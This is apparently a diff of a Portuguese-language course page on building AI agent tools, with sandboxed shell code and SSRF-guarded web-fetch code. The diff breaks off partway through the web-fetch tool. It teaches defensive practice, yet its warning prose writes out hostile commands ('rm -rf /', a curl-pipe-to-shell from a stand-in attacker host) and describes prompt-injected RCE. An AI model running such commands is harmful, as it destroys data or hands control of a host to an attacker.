@@ -1,91 +1,732 @@
 <!DOCTYPE html>
 <html lang="pt-BR" class="dark">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Módulo 2.5 — Tools | New Agentic OS</title><script src="https://cdn.tailwindcss.com"></script><script>tailwind.config={darkMode:'class',theme:{extend:{colors:{primary:'#FACC15',dark:{900:'#111827',800:'#1f2937',700:'#374151',600:'#4b5563'}}}}}</script><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"><style>body{font-family:'Inter',sans-serif}.dark body{background-color:#111827}html:not(.dark) body{background-color:#f8fafc}html:not(.dark) .bg-dark-900{background-color:#fff}html:not(.dark) .bg-dark-800{background-color:#f9fafb}html:not(.dark) .bg-dark-700{background-color:#f3f4f6}html:not(.dark) .bg-dark-600{background-color:#e5e7eb}html:not(.dark) .text-neutral-100{color:#111827}html:not(.dark) .text-neutral-300{color:#4b5563}html:not(.dark) .text-neutral-400{color:#6b7280}html:not(.dark) .border-dark-600{border-color:#d1d5db}html:not(.dark) .text-blue-400{color:#2563eb}html:not(.dark) .bg-blue-500\/20{background-color:rgba(37,99,235,.12)}html:not(.dark) .bg-blue-500\/10{background-color:rgba(37,99,235,.08)}html:not(.dark) .border-blue-500\/30{border-color:rgba(37,99,235,.25)}html:not(.dark) .hover\:bg-blue-500\/10:hover{background-color:rgba(37,99,235,.08)}html:not(.dark) .hover\:text-blue-400:hover{color:#2563eb}html:not(.dark) .text-emerald-400{color:#059669}html:not(.dark) .hover\:text-emerald-400:hover{color:#059669}html:not(.dark) .hover\:bg-emerald-500\/10:hover{background-color:rgba(5,150,105,.08)}html:not(.dark) .text-purple-400{color:#7c3aed}html:not(.dark) .hover\:text-purple-400:hover{color:#7c3aed}html:not(.dark) .hover\:bg-purple-500\/10:hover{background-color:rgba(124,58,237,.08)}html:not(.dark) .text-amber-400{color:#92400e}html:not(.dark) .hover\:text-amber-400:hover{color:#92400e}html:not(.dark) .hover\:bg-amber-500\/10:hover{background-color:rgba(217,119,6,.08)}html:not(.dark) [class*="bg-gradient-to"]{background-image:none!important}html:not(.dark) .text-primary{color:#a16207}html:not(.dark) .bg-primary\/10{background-color:rgba(161,98,7,.08)}html:not(.dark) .border-primary\/40{border-color:rgba(161,98,7,.25)}html:not(.dark) .text-sky-400{color:#0369a1}html:not(.dark) .text-yellow-400{color:#a16207}html:not(.dark) .hover\:text-sky-300:hover{color:#0284c7}html:not(.dark) .hover\:text-yellow-300:hover{color:#854d0e}html:not(.dark) .bg-dark-900\/95{background-color:rgba(255,255,255,.95)}.dark .border-dark-600{border-color:#374151}.code-box{font-family:'Menlo',monospace;font-size:0.85rem}</style></head>
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Módulo 2.5 — Tools que dão dinheiro | New Agentic OS</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>tailwind.config={darkMode:'class',theme:{extend:{colors:{primary:'#FACC15',dark:{900:'#111827',800:'#1f2937',700:'#374151',600:'#4b5563'}}}}}</script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+body{font-family:'Inter',sans-serif}.dark body{background-color:#111827}
+html:not(.dark) body{background-color:#f8fafc}
+html:not(.dark) .bg-dark-900{background-color:#fff}html:not(.dark) .bg-dark-800{background-color:#f9fafb}html:not(.dark) .bg-dark-700{background-color:#f3f4f6}html:not(.dark) .bg-dark-600{background-color:#e5e7eb}
+html:not(.dark) .text-neutral-100{color:#111827}html:not(.dark) .text-neutral-300{color:#4b5563}html:not(.dark) .text-neutral-400{color:#6b7280}html:not(.dark) .text-neutral-500{color:#9ca3af}
+html:not(.dark) .border-dark-600{border-color:#d1d5db}html:not(.dark) .border-dark-700{border-color:#e5e7eb}
+html:not(.dark) .text-blue-400{color:#2563eb}html:not(.dark) .bg-blue-500\/20{background-color:rgba(37,99,235,.12)}html:not(.dark) .bg-blue-500\/10{background-color:rgba(37,99,235,.08)}html:not(.dark) .border-blue-500\/30{border-color:rgba(37,99,235,.25)}html:not(.dark) .bg-blue-900\/20{background-color:rgba(59,130,246,.08)}html:not(.dark) .hover\:bg-blue-500\/10:hover{background-color:rgba(37,99,235,.08)}html:not(.dark) .hover\:text-blue-400:hover{color:#2563eb}
+html:not(.dark) .text-emerald-400{color:#059669}html:not(.dark) .bg-emerald-900\/20{background-color:rgba(5,150,105,.08)}html:not(.dark) .border-emerald-500\/30{border-color:rgba(5,150,105,.25)}html:not(.dark) .hover\:text-emerald-400:hover{color:#059669}html:not(.dark) .hover\:bg-emerald-500\/10:hover{background-color:rgba(5,150,105,.08)}
+html:not(.dark) .text-purple-400{color:#7c3aed}html:not(.dark) .hover\:text-purple-400:hover{color:#7c3aed}html:not(.dark) .hover\:bg-purple-500\/10:hover{background-color:rgba(124,58,237,.08)}
+html:not(.dark) .text-amber-400{color:#92400e}html:not(.dark) .hover\:text-amber-400:hover{color:#92400e}html:not(.dark) .hover\:bg-amber-500\/10:hover{background-color:rgba(217,119,6,.08)}
+html:not(.dark) .text-red-400{color:#b91c1c}html:not(.dark) .bg-red-900\/20{background-color:rgba(239,68,68,.08)}html:not(.dark) .border-red-500\/30{border-color:rgba(239,68,68,.25)}
+html:not(.dark) [class*="bg-gradient-to"]{background-image:none!important}
+html:not(.dark) .text-primary{color:#a16207}html:not(.dark) .bg-primary\/10{background-color:rgba(161,98,7,.08)}html:not(.dark) .border-primary\/40{border-color:rgba(161,98,7,.25)}
+html:not(.dark) .text-sky-400{color:#0369a1}html:not(.dark) .text-yellow-400{color:#a16207}html:not(.dark) .hover\:text-sky-300:hover{color:#0284c7}html:not(.dark) .hover\:text-yellow-300:hover{color:#854d0e}
+html:not(.dark) .bg-dark-900\/95{background-color:rgba(255,255,255,.95)}
+.dark .border-dark-600{border-color:#374151}.dark .divide-dark-600>:not([hidden])~:not([hidden]){border-color:#374151}
+.code-box{font-family:'Menlo',monospace;font-size:0.85rem}
+</style>
+</head>
 <body class="bg-dark-900 text-neutral-100 min-h-screen">
-<nav class="sticky top-0 z-50 bg-dark-900/95 backdrop-blur-sm border-b border-dark-600"><div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex justify-between items-center h-14"><div class="flex items-center space-x-4"><a href="../../index.html" class="flex items-center space-x-2 text-yellow-400 hover:text-yellow-300"><span class="text-2xl">🧠</span><span class="font-bold text-lg hidden sm:inline">New Agentic OS</span></a><span class="text-neutral-600">|</span><a href="https://inema.club" target="_blank" class="text-sky-400 hover:text-sky-300 text-sm font-medium">INEMA.CLUB</a></div><div class="flex items-center space-x-1 sm:space-x-2"><a href="../trilha1/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-emerald-400 hover:bg-emerald-500/10 transition-colors"><span class="sm:hidden">T1</span><span class="hidden sm:inline">Executivo</span></a><a href="index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-blue-400 bg-blue-500/10"><span class="sm:hidden">T2</span><span class="hidden sm:inline">Builder</span></a><a href="../trilha3/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-purple-400 hover:bg-purple-500/10 transition-colors"><span class="sm:hidden">T3</span><span class="hidden sm:inline">Multi-user</span></a><a href="../trilha4/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-amber-400 hover:bg-amber-500/10 transition-colors"><span class="sm:hidden">T4</span><span class="hidden sm:inline">iAmasters OS</span></a><button id="theme-toggle" class="p-2 rounded-lg bg-dark-700 hover:bg-dark-600 transition-colors ml-2"><svg id="theme-toggle-dark-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg><svg id="theme-toggle-light-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path></svg></button></div></div></div></nav>
+
+<nav class="sticky top-0 z-50 bg-dark-900/95 backdrop-blur-sm border-b border-dark-600"><div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex justify-between items-center h-14">
+<div class="flex items-center space-x-4"><a href="../../index.html" class="flex items-center space-x-2 text-yellow-400 hover:text-yellow-300"><span class="text-2xl">🧠</span><span class="font-bold text-lg hidden sm:inline">New Agentic OS</span></a><span class="text-neutral-600">|</span><a href="https://inema.club" target="_blank" class="text-sky-400 hover:text-sky-300 text-sm font-medium">INEMA.CLUB</a></div>
+<div class="flex items-center space-x-1 sm:space-x-2">
+<a href="../trilha1/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-emerald-400 hover:bg-emerald-500/10 transition-colors"><span class="sm:hidden">T1</span><span class="hidden sm:inline">Executivo</span></a>
+<a href="index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-blue-400 bg-blue-500/10"><span class="sm:hidden">T2</span><span class="hidden sm:inline">Builder</span></a>
+<a href="../trilha3/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-purple-400 hover:bg-purple-500/10 transition-colors"><span class="sm:hidden">T3</span><span class="hidden sm:inline">Multi-user</span></a>
+<a href="../trilha4/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-amber-400 hover:bg-amber-500/10 transition-colors"><span class="sm:hidden">T4</span><span class="hidden sm:inline">iAmasters OS</span></a>
+<button id="theme-toggle" class="p-2 rounded-lg bg-dark-700 hover:bg-dark-600 transition-colors ml-2">
+<svg id="theme-toggle-dark-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg>
+<svg id="theme-toggle-light-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path></svg>
+</button>
+</div>
+</div></div></nav>
+
 <nav class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-4"><div class="flex items-center space-x-2 text-sm text-neutral-400"><a href="../../index.html" class="hover:text-blue-400">Início</a><span>/</span><a href="index.html" class="hover:text-blue-400">Trilha 2 · Builder</a><span>/</span><span class="text-blue-400">Módulo 2.5</span></div></nav>
-<header class="bg-gradient-to-br from-blue-900/30 via-dark-800 to-dark-800 py-12 border-b border-dark-600"><div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8"><span class="inline-block px-3 py-1 bg-blue-500/20 text-blue-400 text-xs font-semibold rounded-full mb-4">MÓDULO 2.5</span><h1 class="text-3xl sm:text-4xl font-bold mb-4">🔧 Tools que dão dinheiro</h1><p class="text-lg text-neutral-400 max-w-3xl">Shell, web fetch, calendar, file. Como descrever no JSON Schema sem o modelo errar.</p></div></header>
+
+<header class="bg-gradient-to-br from-blue-900/30 via-dark-800 to-dark-800 py-12 border-b border-dark-600"><div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+<span class="inline-block px-3 py-1 bg-blue-500/20 text-blue-400 text-xs font-semibold rounded-full mb-4">MÓDULO 2.5</span>
+<h1 class="text-3xl sm:text-4xl font-bold mb-4">🛠️ Tools que dão dinheiro</h1>
+<p class="text-lg text-neutral-400 max-w-3xl">Provider responde texto. <strong class="text-blue-400">Tool faz acontecer.</strong> Shell que executa comando, Web que busca conteúdo real, Calendar que agenda, File que escreve. Cada tool é um vetor de receita — e um vetor de risco. Aqui você aprende a fazer as duas coisas direito.</p>
+<div class="grid grid-cols-4 gap-4 mt-8 max-w-2xl">
+<div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600"><div class="text-xl font-bold text-blue-400">6</div><div class="text-xs text-neutral-400">Tópicos</div></div>
+<div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600"><div class="text-xl font-bold text-blue-400">90</div><div class="text-xs text-neutral-400">Minutos</div></div>
+<div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600"><div class="text-xl font-bold text-blue-400">Técnico</div><div class="text-xs text-neutral-400">Nível</div></div>
+<div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600"><div class="text-xl font-bold text-blue-400">Prática</div><div class="text-xs text-neutral-400">Tipo</div></div>
+</div>
+</div></header>
+
 <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
 
-<section id="topico-1" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">1</span><h2 class="text-2xl font-bold">📋 Anatomia</h2></div><div class="bg-dark-800 rounded-xl border border-dark-600 p-6"><pre class="code-box text-neutral-300 overflow-x-auto"><code>class ShellTool(Tool):
+<!-- TOPICO 1 — Anatomia -->
+<section id="topico-1" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">1</span><h2 class="text-2xl font-bold">🧬 Anatomia de uma tool</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">Toda tool tem <strong class="text-blue-400">4 partes</strong>: <code>name</code> (verbo snake_case), <code>description</code> (1-3 frases que o LLM lê pra decidir), <code>parameters</code> (JSON Schema strict) e <code>execute</code> (a função que roda). Nada mais. Se sua tool tem mais conceitos, você está embutindo lógica de negócio que pertence a outra camada.</p>
+
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-6 mb-6">
+<pre class="code-box text-neutral-300 overflow-x-auto"><code>from abc import ABC, abstractmethod
+from dataclasses import dataclass
+
+@dataclass(frozen=True)
+class ToolResult:
+    output: str | None
+    error: str | None = None
+    metadata: dict | None = None
+
+class Tool(ABC):
+    name: str
+    description: str
+    parameters: dict
+    requires_approval: bool = False
+
+    @abstractmethod
+    async def execute(self, session: "Session", **kwargs) -&gt; ToolResult: ...
+
+    def to_openai_schema(self) -&gt; dict:
+        return {
+            "type": "function",
+            "function": {
+                "name": self.name,
+                "description": self.description,
+                "parameters": self.parameters,
+            },
+        }</code></pre>
+</div>
+
+<div class="bg-blue-900/20 rounded-xl border border-blue-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-blue-400 mb-3 flex items-center"><span class="mr-2">📊</span> O que cada parte faz pelo LLM</h3>
+<ul class="space-y-2 text-neutral-300 text-sm">
+<li><strong class="text-blue-400">name:</strong> aparece literal no <code>tool_calls[].name</code>. Mude o nome e quebrar todos os logs históricos.</li>
+<li><strong class="text-blue-400">description:</strong> é <em>system prompt parcial</em>. O LLM escolhe a tool baseado nela. Vaga = nunca chamada (ou chamada errado).</li>
+<li><strong class="text-blue-400">parameters:</strong> JSON Schema. <code>required</code> estrito + <code>additionalProperties: false</code> evitam alucinação de argumentos.</li>
+<li><strong class="text-blue-400">execute:</strong> async. Recebe <code>session</code> (quem chama) + <code>**kwargs</code> (validados pelo schema antes de chegar).</li>
+</ul>
+</div>
+
+<div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+<h3 class="text-lg font-semibold text-primary mb-2 flex items-center"><span class="mr-2">💡</span> Description é system prompt parcial</h3>
+<p class="text-neutral-300 text-sm">O LLM lê a description de toda tool registrada <em>em cada turno</em>. Cada palavra ocupa input tokens e influencia decisão. Trate como prompt: claro, conciso, exemplos, "quando NÃO usar".</p>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">name</strong><p class="text-xs text-neutral-400 mt-1">Verbo + objeto. <code>search_web</code>, <code>send_email</code>.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">description</strong><p class="text-xs text-neutral-400 mt-1">1-3 frases. Exemplo + quando NÃO usar.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">parameters</strong><p class="text-xs text-neutral-400 mt-1">JSON Schema. &lt;7 props. required estrito.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">execute</strong><p class="text-xs text-neutral-400 mt-1">async. Retorna ToolResult, nunca raise.</p></div>
+</div>
+</section>
+
+<!-- TOPICO 2 — ShellTool -->
+<section id="topico-2" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">2</span><h2 class="text-2xl font-bold">🐚 ShellTool — sandbox com whitelist + timeout</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">A tool mais poderosa e a mais perigosa. Dá ao agente acesso a comandos de sistema. Sem sandbox: <code>rm -rf /</code> ou <code>curl atacante.com/x.sh | sh</code> a um prompt de distância. Com sandbox bem-feita: bash útil sem o desespero.</p>
+
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-red-400 mb-3 flex items-center"><span class="mr-2">🚨</span> Alerta crítico</h3>
+<p class="text-neutral-300 text-sm"><code>shell=True</code> + input vindo do user (direto ou indireto via LLM) = <strong class="text-red-400">RCE remoto garantido</strong>. Atacante manda mensagem pro Telegram, LLM converte em tool call, sua VPS vira mineradora de Monero. Nunca, em hipótese alguma, passe string interpolada pro subprocess sem whitelist + escape.</p>
+</div>
+
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-6 mb-6">
+<pre class="code-box text-neutral-300 overflow-x-auto"><code>import asyncio
+import shlex
+from .base import Tool, ToolResult
+
+ALLOWED = {"ls", "cat", "head", "tail", "wc", "grep", "find",
+           "echo", "pwd", "date", "df", "du", "git"}
+
+class ShellTool(Tool):
     name = "shell"
-    description = "Roda comando bash whitelisted (ls, grep, cat, find). Retorna stdout. Use quando precisar inspecionar filesystem."
+    description = (
+        "Executa comandos shell read-only no workspace do usuário. "
+        "Comandos permitidos: ls, cat, head, tail, wc, grep, find, "
+        "echo, pwd, date, df, du, git. "
+        "Use para inspecionar arquivos, contar linhas, buscar padrões. "
+        "NÃO use para modificar arquivos (use file_write) nem para "
+        "instalar pacotes."
+    )
     parameters = {
         "type": "object",
         "properties": {
-            "command": {"type": "string", "description": "Comando completo. Ex: ls -la /tmp"}
+            "command": {
+                "type": "string",
+                "description": "Comando único. Ex: 'ls -la /tmp' ou 'grep TODO src/'",
+            },
+            "timeout_s": {
+                "type": "integer",
+                "description": "Timeout em segundos (1-30). Default 10.",
+                "minimum": 1, "maximum": 30,
+            },
         },
-        "required": ["command"]
+        "required": ["command"],
+        "additionalProperties": False,
     }
-    async def execute(self, command: str) -> ToolResult: ...</code></pre></div></section>
 
-<section id="topico-2" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">2</span><h2 class="text-2xl font-bold">🐚 ShellTool sandboxed</h2></div><div class="bg-dark-800 rounded-xl border border-dark-600 p-6"><pre class="code-box text-neutral-300 overflow-x-auto"><code>import asyncio
-ALLOWED = {"ls", "grep", "cat", "find", "head", "tail", "wc"}
+    async def execute(self, session, command: str, timeout_s: int = 10) -&gt; ToolResult:
+        # 1. Parse seguro
+        try:
+            parts = shlex.split(command)
+        except ValueError as e:
+            return ToolResult(output=None, error=f"parse error: {e}")
+        if not parts:
+            return ToolResult(output=None, error="empty command")
 
-async def execute(self, command: str):
-    binary = command.split()[0]
-    if binary not in ALLOWED:
-        return ToolResult(error=f"comando '{binary}' não autorizado", output=None)
-    try:
-        proc = await asyncio.create_subprocess_shell(
-            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
-            cwd="/tmp/workspace")
-        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
-        return ToolResult(output=stdout.decode()[:5000], error=stderr.decode() if proc.returncode else None)
-    except asyncio.TimeoutError:
-        proc.kill()
-        return ToolResult(error="timeout 30s", output=None)</code></pre></div></section>
+        # 2. Whitelist do binário
+        binary = parts[0].split("/")[-1]
+        if binary not in ALLOWED:
+            return ToolResult(
+                output=None,
+                error=f"command '{binary}' not allowed. "
+                      f"allowed: {sorted(ALLOWED)}",
+            )
 
-<section id="topico-3" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">3</span><h2 class="text-2xl font-bold">🌐 WebFetchTool</h2></div><div class="bg-dark-800 rounded-xl border border-dark-600 p-6"><pre class="code-box text-neutral-300 overflow-x-auto"><code>import httpx, html2text
+        # 3. Bloqueio de metacaracteres perigosos
+        if any(c in command for c in [";", "&amp;&amp;", "||", "|", "&gt;", "&lt;", "`", "$("]):
+            return ToolResult(output=None,
+                              error="pipes/redirects/substitution bloqueados")
+
+        # 4. Subprocess SEM shell=True, com cwd no workspace
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *parts,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                cwd=str(session.workspace),
+            )
+            stdout, stderr = await asyncio.wait_for(
+                proc.communicate(), timeout=timeout_s
+            )
+        except asyncio.TimeoutError:
+            proc.kill()
+            return ToolResult(output=None, error=f"timeout após {timeout_s}s")
+        except FileNotFoundError:
+            return ToolResult(output=None, error=f"binário não encontrado: {binary}")
+
+        out = stdout.decode("utf-8", errors="replace")[:8000]
+        if proc.returncode != 0:
+            err = stderr.decode("utf-8", errors="replace")[:2000]
+            return ToolResult(output=out, error=f"exit {proc.returncode}: {err}")
+        return ToolResult(output=out, metadata={"exit": 0, "bytes": len(out)})</code></pre>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+<div class="bg-emerald-900/20 rounded-xl border border-emerald-500/30 p-6">
+<h4 class="font-bold text-emerald-400 mb-3">✓ 4 defesas em camadas</h4>
+<ul class="space-y-2 text-sm text-neutral-300">
+<li class="flex items-start space-x-2"><span class="text-emerald-400">✓</span><span><code>shlex.split</code> — parse seguro, não interpola.</span></li>
+<li class="flex items-start space-x-2"><span class="text-emerald-400">✓</span><span><strong>Whitelist</strong> de binário, não blacklist.</span></li>
+<li class="flex items-start space-x-2"><span class="text-emerald-400">✓</span><span>Bloqueio explícito de <code>; &amp;&amp; | &gt; ` $()</code>.</span></li>
+<li class="flex items-start space-x-2"><span class="text-emerald-400">✓</span><span><code>create_subprocess_exec</code> (não <code>_shell</code>) + timeout + cwd escopado.</span></li>
+</ul>
+</div>
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6">
+<h4 class="font-bold text-red-400 mb-3">✗ O que dev preguiçoso faz</h4>
+<ul class="space-y-2 text-sm text-neutral-300">
+<li class="flex items-start space-x-2"><span class="text-red-400">✗</span><span><code>os.system(cmd)</code> — RCE servido.</span></li>
+<li class="flex items-start space-x-2"><span class="text-red-400">✗</span><span><code>subprocess.run(cmd, shell=True)</code> — idem.</span></li>
+<li class="flex items-start space-x-2"><span class="text-red-400">✗</span><span>Blacklist de "comandos ruins" — sempre escapável.</span></li>
+<li class="flex items-start space-x-2"><span class="text-red-400">✗</span><span>Sem timeout — agente fica preso, custo escala.</span></li>
+</ul>
+</div>
+</div>
+
+<div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+<h3 class="text-lg font-semibold text-primary mb-3 flex items-center"><span class="mr-2">💡</span> Produção real pede mais</h3>
+<p class="text-neutral-300 text-sm">Em produção séria, rode dentro de <code>firejail</code>, container ou microVM (Firecracker). Whitelist é primeira linha; isolamento de kernel é a segunda. Sem as duas, está apostando.</p>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Whitelist &lt; 20</strong><p class="text-xs text-neutral-400 mt-1">Cada binário liberado é superfície de risco.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Read-only first</strong><p class="text-xs text-neutral-400 mt-1">Comece sem mv, rm, cp. Adicione com cautela.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Output truncado</strong><p class="text-xs text-neutral-400 mt-1">8KB chega. <code>find /</code> não estoura contexto.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">cwd escopado</strong><p class="text-xs text-neutral-400 mt-1">Sempre <code>session.workspace</code>, nunca <code>/</code>.</p></div>
+</div>
+</section>
+
+<!-- TOPICO 3 — WebFetchTool -->
+<section id="topico-3" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">3</span><h2 class="text-2xl font-bold">🌐 WebFetchTool — httpx + html2text</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">Agente que não acessa a web está cego. Mas <code>requests.get(url).text</code> joga 200KB de HTML, CSS, JS no contexto e queima dinheiro. Solução: <code>httpx</code> async + <code>html2text</code> pra extrair só o conteúdo textual + limites duros.</p>
+
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-6 mb-6">
+<pre class="code-box text-neutral-300 overflow-x-auto"><code>import httpx
+import html2text
+from urllib.parse import urlparse
+from .base import Tool, ToolResult
+
+UA = "NewAgenticOS/1.0 (+https://inema.club; contact=ops@example.com)"
+BLOCKED_HOSTS = {"localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254"}
 
 class WebFetchTool(Tool):
-    name = "web_fetch"
-    description = "Baixa URL e retorna conteúdo em markdown limpo. Use pra ler artigos, docs, páginas públicas."
-    parameters = {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}
+    name = "fetch_url"
+    description = (
+        "Baixa o conteúdo textual de uma URL HTTP/HTTPS pública. "
+        "Retorna o texto extraído (sem HTML/JS/CSS), até 12000 chars. "
+        "Use para ler artigos, docs, releases. "
+        "NÃO use para baixar arquivos binários, fazer login, ou "
+        "acessar APIs (use http_post). Não segue mais de 5 redirects."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "url": {
+                "type": "string",
+                "description": "URL absoluta começando com https:// ou http://",
+                "format": "uri",
+            },
+        },
+        "required": ["url"],
+        "additionalProperties": False,
+    }
 
-    async def execute(self, url):
-        async with httpx.AsyncClient(timeout=15, follow_redirects=True,
-            headers={"User-Agent": "Mozilla/5.0"}) as cli:
-            r = await cli.get(url)
-            md = html2text.html2text(r.text)
-            return ToolResult(output=md[:10000], error=None)</code></pre></div></section>
+    def __init__(self):
+        self._h2t = html2text.HTML2Text()
+        self._h2t.ignore_images = True
+        self._h2t.ignore_emphasis = False
+        self._h2t.body_width = 0  # sem wrap
 
-<section id="topico-4" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">4</span><h2 class="text-2xl font-bold">📅 CalendarTool</h2></div><div class="bg-dark-800 rounded-xl border border-dark-600 p-6"><pre class="code-box text-neutral-300 overflow-x-auto"><code>from google.oauth2.credentials import Credentials
+    async def execute(self, session, url: str) -&gt; ToolResult:
+        # SSRF defense
+        parsed = urlparse(url)
+        if parsed.scheme not in ("http", "https"):
+            return ToolResult(output=None, error="apenas http/https")
+        host = (parsed.hostname or "").lower()
+        if host in BLOCKED_HOSTS or host.endswith(".internal"):
+            return ToolResult(output=None, error=f"host bloqueado: {host}")
+
+        try:
+            async with httpx.AsyncClient(
+                timeout=httpx.Timeout(10.0, connect=5.0),
+                follow_redirects=True,
+                max_redirects=5,
+                headers={"User-Agent": UA, "Accept": "text/html,text/plain,*/*"},
+            ) as client:
+                r = await client.get(url)
+        except httpx.TimeoutException:
+            return ToolResult(output=None, error="timeout (10s)")
+        except httpx.HTTPError as e:
+            return ToolResult(output=None, error=f"http error: {e}")
+
+        if r.status_code &gt;= 400:
+            return ToolResult(output=None,
+                              error=f"HTTP {r.status_code} em {url}")
+
